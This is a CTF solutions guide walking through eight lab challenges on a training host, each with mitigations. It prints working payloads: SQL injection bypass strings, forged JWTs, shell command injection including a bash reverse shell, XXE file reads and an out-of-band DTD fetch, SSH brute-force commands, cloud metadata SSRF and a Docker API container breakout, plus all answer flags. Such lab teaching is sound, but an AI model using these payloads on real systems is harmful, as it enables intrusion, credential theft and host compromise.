# CTF Solutions Guide

> **⚠️ SPOILER ALERT**: This document contains full walkthroughs for all challenges. Only read if you're stuck or want to verify your approach.

---

## Table of Contents

1. [Beginner Challenges](#beginner-challenges)
   - [1.1 Login SQLi](#11-login-sqli-port-8001)
   - [1.2 JWT Weak Secret](#12-jwt-weak-secret-port-8002)
   - [1.3 Static Secrets](#13-static-secrets-port-8003)
2. [Medium Challenges](#medium-challenges)
   - [2.1 Command Injection](#21-command-injection-port-8004)
   - [2.2 SSRF Internal](#22-ssrf-internal-port-8005)
   - [2.3 XML XXE](#23-xml-xxe-port-8006)
   - [2.4 SSH Brute Force](#24-ssh-brute-force-port-2222)
3. [Hacking God](#hacking-god)
   - [3.1 Container Breakout](#31-container-breakout-port-8007)

---

## Beginner Challenges

### 1.1 Login SQLi (Port 8001)

**Vulnerability**: SQL Injection in login form  
**Flag**: `CTF{pwned_admin_via_sqli}`  
**Difficulty**: ⭐ Easy

#### Background

The application constructs SQL queries by directly concatenating user input:

```python
query = f"SELECT username FROM users WHERE username = '{username}' AND password = '{password}'"
```

This is a textbook SQL injection vulnerability.

#### Solution Steps

1. **Navigate to the login page**:
   ```
   http://35.210.32.202:8001/login
   ```

2. **Bypass authentication** using classic SQLi payload:

   | Field    | Value                  |
   |----------|------------------------|
   | Username | `admin' --`            |
   | Password | (anything or empty)    |

   **Why it works**: The query becomes:
   ```sql
   SELECT username FROM users WHERE username = 'admin' --' AND password = ''
   ```
   The `--` comments out the password check.

3. **Alternative payloads**:
   - `' OR '1'='1' --` (logs in as first user)
   - `admin'/*` (block comment)
   - `' OR 1=1 --`

4. **Retrieve the flag** at `/flag` after successful login.

#### Tools You Could Use

- **sqlmap** (automated):
   ```bash
   sqlmap -u "http://35.210.32.202:8001/login" --data="username=admin&password=test" --batch --dump
   ```

- **Burp Suite**: Intercept the POST request, send to Repeater, modify parameters.

#### Mitigation

- Use parameterized queries / prepared statements
- Implement input validation
- Use an ORM with proper escaping

---

### 1.2 JWT Weak Secret (Port 8002)

**Vulnerability**: Weak/guessable JWT signing secret  
**Flag**: `CTF{jwt_role_escalation}`  
**Difficulty**: ⭐ Easy

#### Background

The application uses `secret` as the JWT signing key. With this known secret, you can forge tokens.

#### Solution Steps

1. **Get a valid token**:
   ```bash
   curl "http://35.210.32.202:8002/login?username=hacker"
   ```
   Response:
   ```json
   {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
   ```

2. **Decode the token** at [jwt.io](https://jwt.io) or via CLI:
   ```bash
   # Decode payload (base64)
   echo "eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoidXNlciIsImlhdCI6...}" | base64 -d
   ```
   Payload:
   ```json
   {"sub": "hacker", "role": "user", "iat": ..., "exp": ...}
   ```

3. **Check the source code** (hint provided):
   ```bash
   curl "http://35.210.32.202:8002/source"
   ```
   You'll see `SECRET = os.getenv("JWT_SECRET", "secret")`.

4. **Forge a new token** with `role: admin`:

   **Using Python**:
   ```python
   import jwt
   from datetime import datetime, timedelta

   payload = {
       "sub": "hacker",
       "role": "admin",  # Changed from "user"
       "iat": datetime.utcnow(),
       "exp": datetime.utcnow() + timedelta(hours=1)
   }
   token = jwt.encode(payload, "secret", algorithm="HS256")
   print(token)
   ```

   **Using jwt.io**: Paste the token, change `"role": "user"` to `"role": "admin"`, enter `secret` as the key, copy the new token.

5. **Access the admin endpoint**:
   ```bash
   curl -H "Authorization: Bearer <forged_token>" "http://35.210.32.202:8002/admin"
   ```
   Response:
   ```json
   {"flag": "CTF{jwt_role_escalation}"}
   ```

#### Tools You Could Use

- **jwt_tool**:
  ```bash
  python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
  ```

- **hashcat** (for cracking unknown secrets):
  ```bash
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  ```

#### Mitigation

- Use strong, random secrets (256+ bits of entropy)
- Rotate secrets periodically
- Consider asymmetric algorithms (RS256) for sensitive apps

---

### 1.3 Static Secrets (Port 8003)

**Vulnerability**: Sensitive files exposed via misconfigured robots.txt  
**Flag**: `CTF{follow_the_robots}`  
**Difficulty**: ⭐ Easy

#### Background

The `robots.txt` file is meant to guide search engines, but attackers often use it to discover hidden paths.

#### Solution Steps

1. **Check robots.txt**:
   ```bash
   curl "http://35.210.32.202:8003/robots.txt"
   ```
   Output:
   ```
   User-agent: *
   Disallow: /config.bak

   # CTF-hint: Back-ups worden soms verkeerd geplaatst (denk aan .bak-bestanden).
   ```

2. **Access the backup file**:
   ```bash
   curl "http://35.210.32.202:8003/config.bak"
   ```
   This may contain hints or credentials.

3. **Explore the hidden directory**:
   ```bash
   curl "http://35.210.32.202:8003/hidden/"
   ```
   Lists files in the hidden folder.

4. **Retrieve the flag**:
   ```bash
   curl "http://35.210.32.202:8003/hidden/flag.txt"
   ```
   Output: `CTF{follow_the_robots}`

#### Tools You Could Use

- **gobuster** / **dirb** / **ffuf** (directory enumeration):
   ```bash
   gobuster dir -u http://35.210.32.202:8003 -w /usr/share/wordlists/dirb/common.txt
   ```

- **nmap http-enum script**:
   ```bash
   nmap -p 8003 --script http-enum 35.210.32.202
   ```

#### Mitigation

- Don't rely on robots.txt for security
- Remove backup files from web roots
- Implement proper access controls
- Disable directory listing

---

## Medium Challenges

### 2.1 Command Injection (Port 8004)

**Vulnerability**: OS Command Injection via ping utility  
**Flag**: `CTF{rce_through_ping}`  
**Difficulty**: ⭐⭐ Medium

#### Background

The application allows users to ping hosts but doesn't sanitize input, allowing command chaining.

#### Solution Steps

1. **Identify the vulnerable parameter**:
   ```
   http://35.210.32.202:8004/
   ```
   Enter a hostname like `127.0.0.1` and observe the ping output.

2. **Test for command injection**:
   ```
   127.0.0.1; id
   ```
   If you see `uid=0(root)...`, it's vulnerable.

3. **Read the flag**:
   ```
   127.0.0.1; cat /flag.txt
   ```
   Or:
   ```
   127.0.0.1 && cat /flag.txt
   127.0.0.1 | cat /flag.txt
   `cat /flag.txt`
   $(cat /flag.txt)
   ```

4. **Establish a reverse shell** (optional advanced):
   ```bash
   # On your machine:
   nc -lvnp 4444

   # In the vulnerable field:
   127.0.0.1; bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
   ```

#### Tools You Could Use

- **Burp Suite**: Intercept and modify POST data
- **Commix** (automated command injection):
   ```bash
   commix -u "http://35.210.32.202:8004/ping" --data="host=127.0.0.1"
   ```

#### Mitigation

- Avoid calling shell commands with user input
- Use allowlists for expected input
- Use subprocess with shell=False and explicit arguments
- Implement input validation (IP regex)

---

### 2.2 SSRF Internal (Port 8005)

**Vulnerability**: Server-Side Request Forgery accessing internal services  
**Flag**: `CTF{ssrf_metadata_leak}`  
**Difficulty**: ⭐⭐ Medium

#### Background

The app fetches URLs on behalf of users but doesn't restrict internal addresses, allowing access to internal services or cloud metadata.

#### Solution Steps

1. **Identify the fetch functionality**:
   ```
   http://35.210.32.202:8005/
   ```
   Provides a URL input to "preview" external pages.

2. **Test internal access**:
   ```
   http://127.0.0.1:5000/internal
   ```
   Or try the Docker internal network:
   ```
   http://internal-api:5000/secret
   ```

3. **Access the flag endpoint**:
   ```
   http://127.0.0.1:5000/flag
   ```

4. **Cloud metadata exploitation** (if on GCP/AWS):
   ```
   # GCP metadata
   http://metadata.google.internal/computeMetadata/v1/instance/
   
   # AWS metadata
   http://169.254.169.254/latest/meta-data/
   ```

#### Tools You Could Use

- **curl** with various URL schemes
- **Burp Suite Collaborator** for out-of-band testing
- **SSRFmap**:
  ```bash
  python ssrfmap.py -r request.txt -p url -m readfiles
  ```

#### Mitigation

- Validate and allowlist URLs/domains
- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
- Use a URL parser to check the resolved IP before fetching
- Disable unnecessary URL schemes (file://, gopher://, etc.)

---

### 2.3 XML XXE (Port 8006)

**Vulnerability**: XML External Entity Injection  
**Flag**: `CTF{xxe_file_disclosure}`  
**Difficulty**: ⭐⭐ Medium

#### Background

The application parses XML input without disabling external entity processing, allowing file disclosure.

#### Solution Steps

1. **Identify XML input**:
   The app accepts XML data (e.g., for importing user data or API requests).

2. **Craft a malicious XXE payload**:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///flag.txt">
   ]>
   <user>
     <name>&xxe;</name>
   </user>
   ```

3. **Send the payload**:
    ```bash
    curl -X POST -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><user><name>&xxe;</name></user>' \
       "http://35.210.32.202:8006/import"
    ```

4. **Read /etc/passwd** (verification):
   ```xml
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ```

5. **Blind XXE with out-of-band** (if no reflection):
   ```xml
   <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "http://<your-server>/evil.dtd">
     %xxe;
   ]>
   ```

#### Tools You Could Use

- **XXEinjector**:
  ```bash
  ruby XXEinjector.rb --host=<your-ip> --file=request.txt
  ```
- **Burp Suite** with XXE payloads
- **OWASP ZAP** active scanner

#### Mitigation

- Disable DTD processing entirely
- Disable external entity resolution
- Use JSON instead of XML where possible
- Validate and sanitize XML input

---

### 2.4 SSH Brute Force (Port 2222)

**Vulnerability**: Weak SSH credentials  
**Flag**: `CTF{brute_force_victory}` (in `/home/ctfuser/flag.txt`)  
**Difficulty**: ⭐⭐ Medium

#### Background

The SSH service has a user with a weak password that can be discovered through brute-force attacks.

#### Solution Steps

1. **Scan for SSH service**:
   ```bash
   nmap -sV -p 2222 35.210.32.202
   ```
   Output shows SSH on port 2222.

2. **Enumerate users** (optional):
   ```bash
   nmap -p 2222 --script ssh-auth-methods 35.210.32.202
   ```

3. **Brute-force with hydra**:
    ```bash
    hydra -l ctfuser -P /usr/share/wordlists/rockyou.txt \
       -s 2222 ssh://35.210.32.202 -t 4 -V
    ```
   Password: `password123`

4. **Alternative: nmap brute script**:
    ```bash
    nmap -p 2222 --script ssh-brute \
       --script-args userdb=users.txt,passdb=passwords.txt 35.210.32.202
    ```

5. **Login and get the flag**:
   ```bash
   ssh ctfuser@35.210.32.202 -p 2222
   # Password: password123
   cat /home/ctfuser/flag.txt
   ```

6. **Using Metasploit**:
   ```bash
   msfconsole
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 35.210.32.202
   set RPORT 2222
   set USERNAME ctfuser
   set PASS_FILE /usr/share/wordlists/rockyou.txt
   set STOP_ON_SUCCESS true
   run
   ```

#### Tools You Could Use

- **Hydra** (shown above)
- **Medusa**:
   ```bash
   medusa -h 35.210.32.202 -u ctfuser -P passwords.txt -M ssh -n 2222
   ```
- **Metasploit** ssh_login module
- **Ncrack**:
   ```bash
   ncrack -p 2222 --user ctfuser -P passwords.txt 35.210.32.202
   ```

#### Mitigation

- Enforce strong password policies
- Use SSH key authentication only
- Implement fail2ban or similar rate limiting
- Use non-standard ports (security through obscurity, not a real fix)
- Enable 2FA for SSH

---

## Quick Reference: Flags

| Challenge        | Port | Flag                          |
|------------------|------|-------------------------------|
| Login SQLi       | 8001 | `CTF{pwned_admin_via_sqli}`   |
| JWT Weak         | 8002 | `CTF{jwt_role_escalation}`    |
| Static Secrets   | 8003 | `CTF{follow_the_robots}`      |
| Command Injection| 8004 | `CTF{rce_through_ping}`       |
| SSRF Internal    | 8005 | `CTF{ssrf_metadata_leak}`     |
| XML XXE          | 8006 | `CTF{xxe_file_disclosure}`    |
| SSH Brute Force  | 2222 | `CTF{brute_force_victory}`    |
| Container Breakout | 8007 | `CTF{host_root_pwn}`         |

---

## Recommended Tool Installation

```bash
# Kali Linux / Parrot OS (most tools pre-installed)

# Install additional tools
sudo apt update
sudo apt install -y hydra nmap sqlmap gobuster dirb nikto

# Python tools
pip3 install pyjwt requests

# Metasploit
sudo apt install -y metasploit-framework
```

---

## Ethical Hacking Reminder

These challenges are designed for educational purposes in isolated environments. Never use these techniques against systems you don't own or have explicit permission to test.

**Happy Hacking! 🏴‍☠️**

---

## Hacking God

### 3.1 Container Breakout (Port 8007)

**Vulnerability**: SSRF to Docker Remote API (Docker-in-Docker)  
**Flag**: `CTF{host_root_pwn}` (simulated host: `/root/host-flag.txt`)  
**Difficulty**: ⭐⭐⭐ God

#### Background

The web app exposes a server-side fetcher that can make arbitrary HTTP requests (including POST) to internal services. On the internal Docker network, a Docker-in-Docker (dind) daemon is listening on `http://ctf_dind_host:2375` without TLS. The target is to use the Docker Remote API to start a container with the host filesystem mounted, then read a flag from the simulated host at `/root/host-flag.txt`.

This simulates the real-world impact of exposing `/var/run/docker.sock` or an unauthenticated TCP Docker API: full host compromise.

#### Solution Steps

1. Verify connectivity (expect `OK`):
   ```bash
   curl "http://35.210.32.202:8007/fetch?url=http://dind-host:2375/_ping"
   ```

2. Create a container that prints the host flag (bind-mount `/` into `/mnt/host`):
    ```bash
    curl -X POST "http://35.210.32.202:8007/fetch" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       --data-urlencode "method=POST" \
       --data-urlencode "content_type=json" \
       --data-urlencode "url=http://dind-host:2375/containers/create" \
       --data-urlencode 'body={
          "Image":"alpine",
          "Cmd":["/bin/sh","-c","cat /mnt/host/root/host-flag.txt"],
          "HostConfig":{
             "Binds":["/:/mnt/host:ro"],
             "Privileged":true
          }
       }'
    ```
    Save the returned `Id`.

3. Start the container:
    ```bash
    curl -X POST "http://35.210.32.202:8007/fetch" \
       --data-urlencode "method=POST" \
       --data-urlencode "url=http://dind-host:2375/containers/<ID>/start"
    ```

4. Retrieve logs to see the flag:
   ```bash
   curl "http://35.210.32.202:8007/fetch?url=http://dind-host:2375/containers/<ID>/logs?stdout=1"
   ```

#### Tools You Could Use

- curl + jq
- Burp Suite (build requests to the internal API via the SSRF)
- Docker CLI (for reference)

#### Mitigation

- Never expose the Docker API unauthenticated (disable 2375 or use TLS on 2376)
- Do not mount `/var/run/docker.sock` into web apps
- Network-segment internal management APIs
- Use AppArmor/SELinux and enforce least privilege
